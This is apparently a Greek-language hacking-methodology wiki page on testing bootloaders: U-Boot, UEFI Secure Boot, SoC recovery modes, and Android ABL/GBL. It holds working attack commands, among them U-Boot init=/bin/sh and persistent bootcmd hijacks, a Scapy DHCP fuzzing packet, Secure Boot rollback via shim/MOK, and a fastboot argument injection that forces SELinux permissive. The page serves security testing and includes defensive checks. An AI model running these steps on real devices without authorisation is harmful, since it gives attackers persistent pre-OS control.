# Δοκιμές bootloader

{{#include ../../banners/hacktricks-training.md}}

Τα παρακάτω βήματα συνιστώνται για την τροποποίηση των ρυθμίσεων εκκίνησης συσκευών και τη δοκιμή bootloader όπως οι U-Boot και UEFI-class loaders. Εστιάστε στην εκτέλεση κώδικα σε πρώιμο στάδιο, στην αξιολόγηση των προστασιών υπογραφής/rollback και στην κατάχρηση των διαδρομών recovery ή network-boot.

Σχετικά: παράκαμψη secure boot σε MediaTek μέσω patching του bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Γρήγορες νίκες στο U-Boot και κατάχρηση του περιβάλλοντος

1. Πρόσβαση στο interpreter shell
   - Κατά την εκκίνηση, πατήστε ένα γνωστό break key (συχνά οποιοδήποτε πλήκτρο, 0, space ή μια ειδική ακολουθία για τη συγκεκριμένη πλακέτα) πριν εκτελεστεί το `bootcmd`, για να μεταβείτε στο prompt του U-Boot.<sup>[[1]](#references)</sup>

2. Έλεγχος της κατάστασης εκκίνησης και των μεταβλητών
   - Χρήσιμες εντολές:
     - `printenv` (εμφάνιση του environment)
     - `bdinfo` (πληροφορίες πλακέτας, διευθύνσεις μνήμης)
     - `help bootm; help booti; help bootz` (υποστηριζόμενες μέθοδοι εκκίνησης kernel)
     - `help ext4load; help fatload; help tftpboot` (διαθέσιμοι loaders)

3. Τροποποίηση των boot arguments για απόκτηση root shell
   - Προσθέστε το `init=/bin/sh`, ώστε ο kernel να μεταβεί σε shell αντί για το κανονικό init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot από τον TFTP server σας
   - Ρυθμίστε το δίκτυο και ανακτήστε ένα kernel/fit image από το LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Διατηρήστε τις αλλαγές μέσω του περιβάλλοντος
   - Αν η αποθήκευση env δεν είναι προστατευμένη από εγγραφή, μπορείτε να διατηρήσετε τον έλεγχο:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Ελέγξτε για μεταβλητές όπως `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` που επηρεάζουν τις διαδρομές fallback. Εσφαλμένες τιμές μπορεί να επιτρέψουν επανειλημμένη πρόσβαση στο shell.

6. Έλεγχος χαρακτηριστικών αποσφαλμάτωσης/μη ασφαλών χαρακτηριστικών
   - Αναζητήστε: `bootdelay` > 0, απενεργοποιημένο `autoboot`, απεριόριστο `usb start; fatload usb 0:1 ...`, δυνατότητα χρήσης `loady`/`loads` μέσω σειριακής σύνδεσης, `env import` από μη έμπιστα μέσα και kernels/ramdisks που φορτώνονται χωρίς ελέγχους υπογραφής.

7. Δοκιμές εικόνων/επαλήθευσης U-Boot
   - Αν η πλατφόρμα δηλώνει ότι υποστηρίζει secure/verified boot με εικόνες FIT, δοκιμάστε τόσο ανυπόγραφες όσο και αλλοιωμένες εικόνες:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Η απουσία των `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ή η legacy συμπεριφορά `verify=n` συχνά επιτρέπει την εκκίνηση αυθαίρετων payloads.
   - Μην περιορίζεστε σε ένα απλό αποτέλεσμα allow/deny: πρόσφατη έρευνα για FIT έδειξε ότι η ίδια η διαδρομή επαλήθευσης μπορεί να αποτελεί επιφάνεια επίθεσης pre-auth. Κάντε negative tests σε εξωτερικά αποθηκευμένα δεδομένα FIT (`data-offset`, `data-position`, `data-size`), στην επιλογή signed configuration, στα `loadables` και στη διαχείριση overlay / `extra-conf`.
   - Αν έχετε αντίστοιχο source tree, το `test/vboot/vboot_test.sh` είναι ένας γρήγορος τρόπος αναπαραγωγής της συμπεριφοράς επαλήθευσης FIT στο U-Boot sandbox, πριν αγγίξετε πραγματικό hardware.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` και script bootflows
   - Σε σύγχρονες εκδόσεις του U-Boot, το `bootcmd` είναι συχνά απλώς ένα wrapper γύρω από το Standard Boot. Αυτό σημαίνει ότι writable media, PXE ή SPI flash μπορεί να αποτελούν το πραγματικό όριο εμπιστοσύνης, ακόμη κι όταν το ορατό environment φαίνεται ακίνδυνο.
   - Το `extlinux` bootmeth αναζητά το `extlinux/extlinux.conf` κάτω από τα `/` και `/boot`· το script bootmeth αναζητά πρώτα το `boot.scr.uimg` και μετά το `boot.scr`. Κατά το network boot, το όνομα του script μπορεί να προέρχεται από το `boot_script_dhcp`.
   - Χρήσιμες εντολές αρχικής διαλογής:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Περιπτώσεις κατάχρησης προς έλεγχο: μέσα USB/SD που ελέγχει ο attacker και βρίσκονται νωρίτερα στο `boot_targets`, εγγράψιμο `/boot/extlinux/extlinux.conf`, rogue TFTP που παρέχει `boot.scr` ή εκτέλεση script μέσω SPI με χρήση του `script_offset_f`.
   - Αν η πλατφόρμα βασίζεται σε FIT verification, βεβαιωθείτε ότι οι configurations είναι υπογεγραμμένες σε επίπεδο configuration και όχι μόνο ανά image· το `required-mode=all` είναι ισχυρότερο από την αποδοχή οποιουδήποτε μεμονωμένου required key.

## Επιφάνεια network boot (DHCP/PXE) και rogue servers

9. Fuzzing παραμέτρων PXE/DHCP
   - Ο παλαιότερος χειρισμός BOOTP/DHCP του U-Boot έχει παρουσιάσει προβλήματα ασφάλειας μνήμης. Για παράδειγμα, το CVE‑2024‑42040 περιγράφει αποκάλυψη μνήμης μέσω ειδικά διαμορφωμένων DHCP responses, που μπορούν να κάνουν leak bytes από τη μνήμη του U-Boot πίσω στο δίκτυο.<sup>[[4]](#references)</sup> Δοκιμάστε τις διαδρομές κώδικα DHCP/PXE με υπερβολικά μεγάλες τιμές ή τιμές στα όρια (option 67 bootfile-name, vendor options, πεδία file/servername) και παρατηρήστε για hangs/leaks.
   - Ελάχιστο Scapy snippet για την καταπόνηση των παραμέτρων boot κατά το netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Ελέγξτε επίσης αν τα πεδία filename του PXE περνούν σε λογική shell/loader χωρίς sanitization, όταν συνδέονται με scripts provisioning στην πλευρά του OS.

10. Δοκιμές command injection σε rogue DHCP server
   - Ρυθμίστε μια rogue υπηρεσία DHCP/PXE και δοκιμάστε να εισαγάγετε χαρακτήρες στα πεδία filename ή options, ώστε να φτάσετε σε interpreters εντολών σε μεταγενέστερα στάδια της αλυσίδας boot. Τα auxiliary του Metasploit για DHCP, το `dnsmasq` ή custom scripts με Scapy είναι κατάλληλα. Φροντίστε πρώτα να απομονώσετε το δίκτυο του lab.

## Λειτουργίες ανάκτησης SoC ROM που παρακάμπτουν το κανονικό boot

Πολλά SoC διαθέτουν λειτουργία "loader" στο BootROM, η οποία δέχεται κώδικα μέσω USB/UART ακόμη κι όταν τα flash images δεν είναι έγκυρα. Αν δεν έχουν ενεργοποιηθεί τα secure-boot fuses, αυτό μπορεί να προσφέρει arbitrary code execution πολύ νωρίς στην αλυσίδα.

- NXP i.MX (Serial Download Mode)
  - Εργαλεία: `uuu` (mfgtools3) ή `imx-usb-loader`.
  - Παράδειγμα: `imx-usb-loader u-boot.imx` για να φορτώσετε και να εκτελέσετε ένα custom U-Boot από τη RAM.
- Allwinner (FEL)
  - Εργαλείο: `sunxi-fel`.
  - Παράδειγμα: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ή `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Εργαλείο: `rkdeveloptool`.
  - Παράδειγμα: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` για να φορτώσετε προσωρινά έναν loader και να ανεβάσετε ένα custom U-Boot.

Ελέγξτε αν έχουν καεί τα secure-boot eFuses/OTP της συσκευής. Αν όχι, οι λειτουργίες λήψης του BootROM συχνά παρακάμπτουν κάθε έλεγχο επαλήθευσης ανώτερου επιπέδου (U-Boot, kernel, rootfs), εκτελώντας απευθείας το payload πρώτου σταδίου από SRAM/DRAM.

## Bootloaders UEFI/PC-class: γρήγοροι έλεγχοι

11. Δοκιμές tampering του ESP, rollback και εγγραφής κλειδιών
   - Προσαρτήστε το EFI System Partition (ESP) και ελέγξτε για στοιχεία loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, διαδρομές λογότυπων κατασκευαστών.
   - Όποτε είναι δυνατό, κάντε dump την κατάσταση του Secure Boot και τις βάσεις δεδομένων κλειδιών από το OS:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Αν η πλατφόρμα βρίσκεται σε Setup Mode, δέχεται εγγραφή κλειδιών χωρίς έλεγχο ταυτότητας ή διαθέτει προεπιλεγμένο/δοκιμαστικό Platform Key (κατηγορία PKfail), ένας τοπικός διαχειριστής ή επιτιθέμενος με φυσική πρόσβαση μπορεί να εγγράψει τα δικά του KEK/db και να διατηρήσει την ένδειξη ότι το Secure Boot είναι «ενεργό», ενώ εκκινεί αυθαίρετα EFI binaries.<sup>[[3]](#references)</sup>
   - Δοκιμάστε εκκίνηση με παλαιότερα ή γνωστά ευάλωτα υπογεγραμμένα στοιχεία εκκίνησης, αν οι ανακλήσεις Secure Boot (dbx) δεν είναι ενημερωμένες. Αν η πλατφόρμα εξακολουθεί να εμπιστεύεται παλιά shims/bootmanagers, συχνά μπορείτε να φορτώσετε τον δικό σας kernel ή το `grub.cfg` από το ESP για να αποκτήσετε persistence.
   - Στα Windows, ακόμα και ενημερωμένα συστήματα μπορεί να εξακολουθούν να αποδέχονται ευάλωτους υπογεγραμμένους boot managers, αν ο υπογράφων `Microsoft Windows Production PCA 2011` εξακολουθεί να απουσιάζει από το firmware `dbx`, όπως παρατηρήθηκε με το BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Μια παράκαμψη τύπου Baton Drop μπορεί να εγγράψει ένα MOK του επιτιθέμενου· στη συνέχεια, ένα νόμιμο shim μπορεί να φορτώσει ένα EFI payload υπογεγραμμένο με αυτό το κλειδί σε επόμενες εκκινήσεις.<sup>[[12]](#references)[[13]](#references)</sup> Η μεταγενέστερη ανάκληση του παλιού υπογράφοντος των Windows δεν αφαιρεί το εγγεγραμμένο MOK, επομένως η διαδρομή μέσω shim μπορεί να παραμείνει διαθέσιμη, αν το συγκεκριμένο shim εξακολουθεί να είναι έμπιστο.<sup>[[12]](#references)</sup>
   - Πριν δοκιμάσετε αυτήν τη διαδρομή υποβάθμισης σε εξουσιοδοτημένο μηχάνημα UEFI, ελέγξτε την **πραγματική κατάσταση ανακλήσεων του firmware**, όχι μόνο το ιστορικό ενημερώσεων των Windows.<sup>[[13]](#references)[[14]](#references)</sup> Η Microsoft παρέχει τον παρακάτω έλεγχο PowerShell, μόνο για ανάγνωση και με αυξημένα δικαιώματα, για τον υπογράφοντα του 2011 στο `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     Το `False` αποτελεί μόνο ένδειξη: επιβεβαιώστε το συγκεκριμένο υπογεγραμμένο στοιχείο εκκίνησης και τυχόν άλλες ανακλήσεις σε εργαστήριο με δυνατότητα ανάκτησης.<sup>[[12]](#references)[[14]](#references)</sup> Μια εκκρεμής ενημέρωση μητρώου ή ένα πιστοποιητικό υπογραφής που έχει λήξει δεν ισοδυναμεί με ολοκληρωμένη ανάκληση `dbx`.<sup>[[13]](#references)[[14]](#references)</sup>

12. Έλεγχος ανακλήσεων για παλιές εκδόσεις shim / SBAT / dbx
   - Παλιές εκδόσεις shim υπογεγραμμένες από τη Microsoft και forks προμηθευτών μπορούν να εξακολουθούν να λειτουργούν ως διαδρομή bootkit τύπου BYOVD, αν οι ανακλήσεις είναι παλιές. Σε απομονωμένο εργαστήριο, τοποθετήστε μια ιστορικά ευάλωτη έκδοση shim στο ESP και επιχειρήστε να αλυσιδώσετε τη φόρτωση του δικού σας `grubx64.efi` ή πυρήνα.<sup>[[11]](#references)</sup>
   - Γρήγορη αρχική αξιολόγηση:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Αν το shim εξακολουθεί να εκτελείται παρότι βρίσκεται στη λίστα ανάκλησης, το firmware/OS έχει παρωχημένες ενημερώσεις `dbx` ή εμπιστεύεται έναν forked loader που δεν κληρονόμησε ποτέ τις upstream προστασίες SBAT.

13. Σφάλματα ανάλυσης boot logo (κατηγορία LogoFAIL)
   - Αρκετά firmware OEM/IBV ήταν ευάλωτα σε σφάλματα ανάλυσης εικόνων στο DXE, κατά την επεξεργασία boot logo. Αν ένας attacker μπορεί να τοποθετήσει μια ειδικά διαμορφωμένη εικόνα στο ESP, σε διαδρομή συγκεκριμένη για τον vendor (π.χ., `\EFI\<vendor>\logo\*.bmp`), και να κάνει επανεκκίνηση, ενδέχεται να είναι δυνατή η εκτέλεση κώδικα κατά την πρώιμη εκκίνηση, ακόμη και με ενεργοποιημένο το Secure Boot. Ελέγξτε αν η πλατφόρμα δέχεται logo που παρέχονται από τον χρήστη και αν αυτές οι διαδρομές είναι εγγράψιμες από το OS.<sup>[[2]](#references)</sup>


## Κενά εμπιστοσύνης στο Android/Qualcomm ABL + GBL (Android 16)

Σε συσκευές Android 16 που χρησιμοποιούν το ABL της Qualcomm για τη φόρτωση της **Generic Bootloader Library (GBL)**, επαληθεύστε αν το ABL **επαληθεύει την αυθεντικότητα** της UEFI app που φορτώνει από το partition `efisp`. Αν το ABL ελέγχει μόνο αν υπάρχει μια UEFI app, χωρίς να επαληθεύει τις υπογραφές της, τότε ένα write primitive στο `efisp` επιτρέπει **εκτέλεση μη υπογεγραμμένου κώδικα πριν από το OS** κατά την εκκίνηση.<sup>[[6]](#references)[[7]](#references)</sup>

Πρακτικοί έλεγχοι και τρόποι κατάχρησης:

- **write primitive στο efisp**: Χρειάζεστε έναν τρόπο να γράψετε μια προσαρμοσμένη UEFI app στο `efisp` (root/προνομιούχα υπηρεσία, σφάλμα σε OEM app, διαδρομή recovery/fastboot). Χωρίς αυτό, το κενό στη φόρτωση του GBL δεν είναι άμεσα προσβάσιμο.<sup>[[6]](#references)</sup>
- **Εισαγωγή argument στο fastboot OEM** (σφάλμα ABL): Ορισμένα builds δέχονται επιπλέον tokens στο `fastboot oem set-gpu-preemption` και τα προσθέτουν στη γραμμή εντολών του kernel. Αυτό μπορεί να χρησιμοποιηθεί για να επιβληθεί permissive SELinux, επιτρέποντας εγγραφές σε προστατευμένα partitions:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Αν η συσκευή είναι ενημερωμένη με patch, η εντολή θα πρέπει να απορρίπτει τα επιπλέον ορίσματα.<sup>[[5]](#references)[[6]](#references)</sup>
- **Ξεκλείδωμα Bootloader μέσω persistent flags**: Ένα payload σε στάδιο boot μπορεί να αλλάξει persistent flags (π.χ. `is_unlocked=1`, `is_unlocked_critical=1`), ώστε να προσομοιώσει την εντολή `fastboot oem unlock` χωρίς ελέγχους OEM server/έγκρισης. Αυτό οδηγεί σε μόνιμη αλλαγή κατάστασης μετά την επόμενη επανεκκίνηση.<sup>[[6]](#references)</sup>

Σημειώσεις άμυνας/διαλογής:

- Επιβεβαιώστε αν το ABL εκτελεί επαλήθευση υπογραφής στο GBL/UEFI payload από το `efisp`. Αν όχι, αντιμετωπίστε το `efisp` ως επιφάνεια persistence υψηλού κινδύνου.
- Ελέγξτε αν έχουν γίνει patch οι fastboot OEM handlers του ABL, ώστε να **επικυρώνουν τον αριθμό των ορισμάτων** και να απορρίπτουν επιπλέον tokens.<sup>[[8]](#references)[[9]](#references)</sup>

## Προφυλάξεις για το υλικό

Να είστε προσεκτικοί όταν αλληλεπιδράτε με μνήμη flash SPI/NAND κατά την πρώιμη εκκίνηση (π.χ. γείωση ακίδων για παράκαμψη αναγνώσεων) και να συμβουλεύεστε πάντα το datasheet της flash. Τα βραχυκυκλώματα σε λάθος χρονική στιγμή μπορεί να προκαλέσουν αλλοίωση της συσκευής ή του programmer.

## Σημειώσεις και πρόσθετες συμβουλές

- Δοκιμάστε τις εντολές `env export -t ${loadaddr}` και `env import -t ${loadaddr}` για να μεταφέρετε blobs περιβάλλοντος μεταξύ RAM και αποθηκευτικού χώρου· ορισμένες πλατφόρμες επιτρέπουν την εισαγωγή env από αφαιρούμενα μέσα χωρίς authentication.
- Για persistence σε συστήματα βασισμένα σε Linux που εκκινούν μέσω `extlinux.conf`, συχνά αρκεί η τροποποίηση της γραμμής `APPEND` (για εισαγωγή των `init=/bin/sh` ή `rd.break`) στο boot partition, όταν δεν εφαρμόζονται έλεγχοι υπογραφής.
- Αν ο στόχος χρησιμοποιεί ενημερώσεις dual-slot / A/B, εξετάστε τις τεχνικές anti-rollback και slot-desync στην [επισκόπηση ανάλυσης firmware](README.md), ώστε να μην παραβλέψετε κενά εμπιστοσύνης που αφορούν μόνο τον updater και βρίσκονται εκτός του ίδιου του bootloader.
- Αν το userland παρέχει `fw_printenv/fw_setenv`, επαληθεύστε ότι το `/etc/fw_env.config` αντιστοιχεί στην πραγματική αποθήκευση env. Οι λανθασμένες ρυθμίσεις των offsets μπορεί να οδηγήσουν σε ανάγνωση/εγγραφή σε λάθος περιοχή MTD.

## References

- [1] [Μεθοδολογία δοκιμών ασφάλειας firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Ανακαλύπτοντας το LogoFAIL: Οι κίνδυνοι της ανάλυσης εικόνων κατά την εκκίνηση του συστήματος](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Μη έμπιστα κλειδιά πλατφόρμας υπονομεύουν το Secure Boot στο οικοσύστημα UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Λεπτομέρειες CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Ξεκλείδωμα Xiaomi μέσω δύο μη εξυγιασμένων συμβολοσειρών](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Το exploit GBL του Qualcomm Snapdragon 8 Elite επιτρέπει σε επιτιθέμενους να ξεκλειδώσουν bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Αρχιτεκτονική Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Διόρθωση της προώθησης μη έμπιστης εισόδου στη γραμμή εντολών του kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Προσθήκη ελέγχου για την εντολή set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Ακατάλληλο για boot: Κατάρριψη της επαλήθευσης υπογραφής FIT του U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Σημείωση ευπάθειας VU#616257 - Bootloaders UEFI shim υπογεγραμμένοι από τη Microsoft, ευάλωτοι σε παράκαμψη του Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [UEFI bootkit BlackLotus: Επιβεβαιώθηκε ο μύθος](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: UEFI bootkit παρόμοιο με το BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Πώς να διαχειριστείτε τις ανακλήσεις του Windows Boot Manager για αλλαγές στο Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
